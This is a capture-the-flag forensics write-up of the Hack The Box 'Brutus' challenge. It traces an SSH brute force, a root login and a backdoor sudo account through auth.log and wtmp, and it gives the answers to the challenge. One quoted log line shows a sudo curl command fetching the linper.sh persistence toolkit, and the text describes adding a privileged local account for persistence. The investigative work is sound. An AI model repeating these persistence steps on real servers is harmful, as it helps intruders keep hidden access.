# HTB Sherlock — Brutus

> **Category:** DFIR (Digital Forensics & Incident Response)
> **Difficulty:** Easy
> **Platform:** Hack The Box — Sherlocks
> **Status:** ✅ Solved

---

## 📌 Overview

| Field       | Details                          |
|-------------|----------------------------------|
| Challenge   | Brutus                           |
| Category    | DFIR                             |
| Difficulty  | Easy                             |
| Files Given | `auth.log`, `wtmp`               |
| Tools Used  | `grep`, `awk`, `python3`, `utmpdump` |

### Scenario

In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

---

## 🗂️ Provided Artifacts

- `auth.log` — Linux authentication log file
- `wtmp` — Binary log of login/logout sessions
- `utmp.py` — the script was provided to parse the `wtmp` file

---

## 🔍 Analysis

### Task 1 — Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**Question:** Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**Approach:**

```bash
grep 'Failed password' auth.log | sort | uniq -c | sort -rn | head
```

**Finding:**
![[Pasted image 20260609153434.png]]
```
A single IP address had hundreds of failed password attempts in a short time,
clearly standing out from normal traffic — a classic brute-force pattern.
```

**Answer:** `65.2.161.68`

---

### Task 2 — The brute force attack was successful. What account was compromised?

**Question:** The bruteforce attempts were successful and the attacker gained access to an account on the server. What is the username of that account?

**Approach:**
![[Pasted image 20260609150003.png]]
```bash
grep 'Accepted password' auth.log | grep '65.2.161.68'
```

**Finding:**

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68
```

**Answer:** `root`

---


---
### Task 3 — What is the UTC timestamp of the attacker's interactive login session?

**Question:** The attacker logged in manually to the server and established a terminal session to carry out their objectives. What is the UTC timestamp of this session? (The login time will be different from the authentication time and can be found in the wtmp artifact.)

**Approach:**

Since `utmpdump` was unavailable on the system (removed from newer versions of `util-linux`), a custom Python script was used to parse the binary `wtmp` file:

```bash
 TZ=UTC python3 utmp.py wtmp | grep '65.2.161.68'
```

**Finding:**
![[Pasted image 20260609150907.png]]

```
"USER" "2549" "pts/1" "ts/1" "root" "65.2.161.68" "0" "0" "0" "2024/03/06 06:32:45" "387923" "65.2.161.68"
```

Note: The `wtmp` timestamp (`06:32:45`) is 1 second after the `auth.log` authentication time (`06:32:44`) — this is because `auth.log` records the authentication event while `wtmp` records when the terminal session actually started.

**Answer:** `2024-03-06 06:32:45`

### Task 4 — What is the session number assigned to the attacker's session?

**Question:** SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

**Approach:**

```bash
grep 'session' auth.log | grep '06:32:44'
```

**Finding:**
![[Pasted image 20260609150106.png|697]]
```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

**Answer:** `37`

---

### Task 5 — What is the name of the backdoor account created by the attacker?

**Question:** The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

**Approach:**

```bash
grep 'new user' auth.log
grep 'sudo' auth.log | grep 'cyberjunkie'
```

**Finding:**
![[Pasted image 20260609151357.png|697]]
```
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

The attacker created a new local user `cyberjunkie` and immediately added them to the `sudo` group for elevated privileges, establishing persistence on the server.

**Answer:** `cyberjunkie`

---

### Task 6 — What is the MITRE ATT&CK sub-technique ID used for persistence?

**Question:** What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

**Approach:**

No command needed here because this is a MITRE ATT&CK framework knowledge question. The attacker created a local Linux user (`cyberjunkie`) with sudo privileges, which maps directly to the **Create Account** technique.

**Finding:**

- **T1136** — Create Account (parent technique)
- **T1136.001** — Create Account: Local Account (sub-technique)

Reference: https://attack.mitre.org/techniques/T1136/001

**Answer:** `T1136.001`

---

### Task 7 — When did the attacker's first SSH session end?

**Question:** What time did the attacker's first SSH session end according to auth.log?

**Approach:**

```bash
grep 'session closed for user root' auth.log
```

**Finding:**
![[Pasted image 20260609151804.png]]
```
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
```

The PID `2491` matches the session opened at `06:32:44`, confirming this is the attacker's root session closing. Since the server is an AWS instance (`ip-172-31-35-28`), its clock runs in UTC by default.

**Answer:** `2024-03-06 06:37:24`

---

### Task 8 — What was the full sudo command used to download a script?

**Question:** The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

**Approach:**

```bash
grep 'sudo' auth.log | grep 'cyberjunkie'
```

**Finding:**
![[Pasted image 20260609151613.png]]
```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The attacker used `cyberjunkie`'s sudo privileges to download `linper.sh` — a Linux persistence toolkit from GitHub — using `curl`.

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---


## 🧠 Key Takeaways

- **Log Analysis:** Linux `auth.log` records SSH brute-force attempts, successful logins, sudo usage, and session events.
- **`wtmp` parsing:** `wtmp` is a binary file — use `utmpdump` or a Python script to parse it. It records actual terminal session start times, which differ slightly from `auth.log` authentication times.
- **Brute-Force Detection:** Hundreds of failed password attempts from a single IP in a short window are a clear indicator of automated brute-force activity.
- **Persistence via Local Account:** Creating a new privileged local user (`T1136.001`) is a classic attacker persistence technique — always audit `/etc/passwd` and sudo group membership post-incident.
- **Cross-referencing artifacts:** `auth.log` lacks a year in its timestamps — always cross-reference with `wtmp` to confirm the correct year.
- **AWS default timezone:** AWS EC2 instances run UTC by default, so `auth.log` timestamps are already in UTC unless explicitly changed.
---

## 📝 Notes

- `utmpdump` is no longer available on newer Kali Linux versions as it was removed from `util-linux`. A Python-based parser (`utmp.py`) was used as an alternative.
- The attacker's first action after gaining root was to create a backdoor account rather than operate solely as root — this is a common tactic to maintain access even if the root password is changed.
- `linper.sh` (Linux Persistence toolkit) is an open-source post-exploitation tool available on GitHub under `montysecurity/linper`.

---

*Writeup by: XeroMatrix
*Date: 08-06-2026*
